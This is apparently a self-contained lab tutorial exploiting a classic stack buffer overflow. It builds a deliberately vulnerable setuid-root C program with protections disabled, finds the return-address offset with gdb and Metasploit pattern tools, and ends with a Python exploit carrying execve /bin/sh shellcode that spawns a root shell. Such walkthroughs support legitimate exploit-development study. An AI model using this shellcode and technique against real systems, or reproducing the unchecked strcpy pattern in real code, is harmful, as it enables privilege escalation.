#### Classic Stack Based Buffer Overflow

``vuln.c``

```c
//vuln.c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
        /* [1] */ char buf[256];
        /* [2] */ strcpy(buf,argv[1]);
        /* [3] */ printf("Input:%s\n",buf);
        return 0;
}
```

```sh
u32@dev:~$ sudo su
[sudo] password for u32:
root@dev:/home/u32# echo 0 > /proc/sys/kernel/randomize_va_space
root@dev:/home/u32# exit
exit
u32@dev:~$
```

```sh
u32@dev:~$ ll vuln.c
-rw-rw-r-- 1 u32 u32 220 Feb  3 12:01 vuln.c
u32@dev:~$ 
```

```sh
u32@dev:~$ gcc -g -fno-stack-protector -z execstack -o vuln vuln.c
```

```sh
u32@dev:~$ ll vuln*
-rwxrwxr-x 1 u32 u32 8210 Feb  3 12:02 vuln*
-rw-rw-r-- 1 u32 u32  220 Feb  3 12:01 vuln.c
u32@dev:~$
```

```sh
u32@dev:~$ sudo chown root vuln
u32@dev:~$ sudo chgrp root vuln
u32@dev:~$ sudo chmod +s vuln
```

```sh
u32@dev:~$ ll vuln*
-rwsrwsr-x 1 root root 8210 Feb  3 12:02 vuln*
-rw-rw-r-- 1 u32  u32   220 Feb  3 12:01 vuln.c
u32@dev:~$
```

```sh
u32@dev:~$ touch ~/.gdbinit
u32@dev:~$ echo "set disassembly-flavor intel" > .gdbinit
```

```sh
u32@dev:~$ gdb ./vuln -q
Reading symbols from /home/u32/vuln...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048414 <+0>:	push   ebp
   0x08048415 <+1>:	mov    ebp,esp
   0x08048417 <+3>:	and    esp,0xfffffff0
   0x0804841a <+6>:	sub    esp,0x110
   0x08048420 <+12>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048423 <+15>:	add    eax,0x4
   0x08048426 <+18>:	mov    eax,DWORD PTR [eax]
   0x08048428 <+20>:	mov    DWORD PTR [esp+0x4],eax
   0x0804842c <+24>:	lea    eax,[esp+0x10]
   0x08048430 <+28>:	mov    DWORD PTR [esp],eax
   0x08048433 <+31>:	call   0x8048330 <strcpy@plt>
   0x08048438 <+36>:	mov    eax,0x8048530
   0x0804843d <+41>:	lea    edx,[esp+0x10]
   0x08048441 <+45>:	mov    DWORD PTR [esp+0x4],edx
   0x08048445 <+49>:	mov    DWORD PTR [esp],eax
   0x08048448 <+52>:	call   0x8048320 <printf@plt>
   0x0804844d <+57>:	mov    eax,0x0
   0x08048452 <+62>:	leave
   0x08048453 <+63>:	ret
End of assembler dump.
(gdb)
```

```sh
u32@dev:~$ gdb ./vuln -q
Reading symbols from /home/u32/vuln...done.
(gdb) r `python -c "print 'A'* 300"`
Starting program: /home/u32/vuln `python -c "print 'A'* 300"`
Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
```

```sh
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
root@kali:~#
```

```sh
u32@dev:~$ gdb ./vuln -q
Reading symbols from /home/u32/vuln...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Starting program: /home/u32/vuln Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Input:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
(gdb)
```

```sh
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6a413969
[*] Exact match at offset 268
root@kali:~#
```

```buf.py```

```python
import struct

buf = "A" * 268
buf += struct.pack("<I",0xd3adc0d3)

print buf
```

```sh
u32@dev:~$ gdb ./vuln -q
Reading symbols from /home/u32/vuln...done.
(gdb) r `python buf.py`
Starting program: /home/u32/vuln `python buf.py`
Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����

Program received signal SIGSEGV, Segmentation fault.
0xd3adc0d3 in ?? ()
(gdb) x/300xw $esp
0xbffff5f0:	0x00000000	0xbffff684	0xbffff690	0xb7fdc858
0xbffff600:	0x00000000	0xbffff61c	0xbffff690	0x00000000
0xbffff610:	0x0804822c	0xb7fc6ff4	0x00000000	0x00000000
0xbffff620:	0x00000000	0xc156ed32	0xf9944922	0x00000000
0xbffff630:	0x00000000	0x00000000	0x00000002	0x08048360
0xbffff640:	0x00000000	0xb7ff26b0	0xb7e393f9	0xb7ffeff4
0xbffff650:	0x00000002	0x08048360	0x00000000	0x08048381
0xbffff660:	0x08048414	0x00000002	0xbffff684	0x08048460
0xbffff670:	0x080484d0	0xb7fed280	0xbffff67c	0xb7fff918
0xbffff680:	0x00000002	0xbffff7ae	0xbffff7bd	0x00000000
0xbffff690:	0xbffff8ce	0xbffff8de	0xbffff8f2	0xbffff942
0xbffff6a0:	0xbffff962	0xbffff975	0xbffff97e	0xbffffe9f
0xbffff6b0:	0xbffffeab	0xbffffef8	0xbfffff0b	0xbfffff1a
0xbffff6c0:	0xbfffff28	0xbfffff39	0xbfffff42	0xbfffff51
0xbffff6d0:	0xbfffff59	0xbfffff65	0xbfffff7a	0xbfffffab
0xbffff6e0:	0xbfffffcb	0x00000000	0x00000020	0xb7fdd414
0xbffff6f0:	0x00000021	0xb7fdd000	0x00000010	0x0fabfbff
0xbffff700:	0x00000006	0x00001000	0x00000011	0x00000064
0xbffff710:	0x00000003	0x08048034	0x00000004	0x00000020
0xbffff720:	0x00000005	0x00000009	0x00000007	0xb7fde000
0xbffff730:	0x00000008	0x00000000	0x00000009	0x08048360
0xbffff740:	0x0000000b	0x000003e8	0x0000000c	0x000003e8
0xbffff750:	0x0000000d	0x000003e8	0x0000000e	0x000003e8
0xbffff760:	0x00000017	0x00000001	0x00000019	0xbffff78b
0xbffff770:	0x0000001f	0xbfffffed	0x0000000f	0xbffff79b
0xbffff780:	0x00000000	0x00000000	0x4a000000	0x8687d5a1
0xbffff790:	0x6b269f5e	0xcd1c6cf5	0x69e8d980	0x00363836
0xbffff7a0:	0x00000000	0x00000000	0x00000000	0x682f0000
0xbffff7b0:	0x2f656d6f	0x2f323375	0x6e6c7576	0x41414100
0xbffff7c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff7d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff7e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff7f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff800:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff810:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff820:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff830:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff840:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff850:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff860:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff870:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff880:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff890:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff8a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff8b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff8c0:	0x41414141	0x41414141	0xadc0d341	0x485300d3
0xbffff8d0:	0x3d4c4c45	0x6e69622f	0x7361622f	0x45540068
0xbffff8e0:	0x783d4d52	0x6d726574	0x3635322d	0x6f6c6f63
0xbffff8f0:	0x44580072	0x45535f47	0x4f495353	0x4f435f4e
0xbffff900:	0x45494b4f	0x6537633d	0x32303339	0x38663131
---Type <return> to continue, or q <return> to quit---
0xbffff910:	0x38323136	0x32663330	0x36333465	0x30303033
0xbffff920:	0x30303030	0x35312d32	0x38363731	0x39323038
0xbffff930:	0x3730332e	0x2d363436	0x31393336	0x31393637
0xbffff940:	0x53530038	0x4c435f48	0x544e4549	0x3239313d
0xbffff950:	0x3836312e	0x342e312e	0x35323520	0x32203039
0xbffff960:	0x53530032	0x54545f48	0x642f3d59	0x702f7665
0xbffff970:	0x312f7374	0x45535500	0x33753d52	0x534c0032
0xbffff980:	0x4c4f435f	0x3d53524f	0x303d7372	0x3d69643a
0xbffff990:	0x333b3130	0x6e6c3a34	0x3b31303d	0x6d3a3633
0xbffff9a0:	0x30303d68	0x3d69703a	0x333b3034	0x6f733a33
0xbffff9b0:	0x3b31303d	0x643a3533	0x31303d6f	0x3a35333b
0xbffff9c0:	0x343d6462	0x33333b30	0x3a31303b	0x343d6463
0xbffff9d0:	0x33333b30	0x3a31303b	0x343d726f	0x31333b30
0xbffff9e0:	0x3a31303b	0x333d7573	0x31343b37	0x3d67733a
0xbffff9f0:	0x343b3033	0x61633a33	0x3b30333d	0x743a3134
0xbffffa00:	0x30333d77	0x3a32343b	0x333d776f	0x32343b34
0xbffffa10:	0x3d74733a	0x343b3733	0x78653a34	0x3b31303d
0xbffffa20:	0x2a3a3233	0x7261742e	0x3b31303d	0x2a3a3133
0xbffffa30:	0x7a67742e	0x3b31303d	0x2a3a3133	0x6a72612e
0xbffffa40:	0x3b31303d	0x2a3a3133	0x7a61742e	0x3b31303d
0xbffffa50:	0x2a3a3133	0x687a6c2e	0x3b31303d	0x2a3a3133
0xbffffa60:	0x6d7a6c2e	0x31303d61	0x3a31333b	0x6c742e2a
0xbffffa70:	0x31303d7a	0x3a31333b	0x78742e2a	0x31303d7a
0xbffffa80:	0x3a31333b	0x697a2e2a	0x31303d70	0x3a31333b
0xbffffa90:	0x3d7a2e2a	0x333b3130	0x2e2a3a31	0x31303d5a
(gdb)
```

![](images/1.png)

[``Linux/x86 execve /bin/sh shellcode 23 bytes``](http://shell-storm.org/shellcode/files/shellcode-827.php)

``buf.py``

```python
import struct

padding = "A" * 268
eip = struct.pack("I",0xbffff7c0)
nopsled = "\x90"*100
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

print padding+eip+nopsled+shellcode
```

```sh
u32@dev:~$ ./vuln `python buf.py`
Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS��
                                                                                                                                                                                                  ̀
# id
uid=1000(u32) gid=1000(u32) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),1000(u32)
#
```
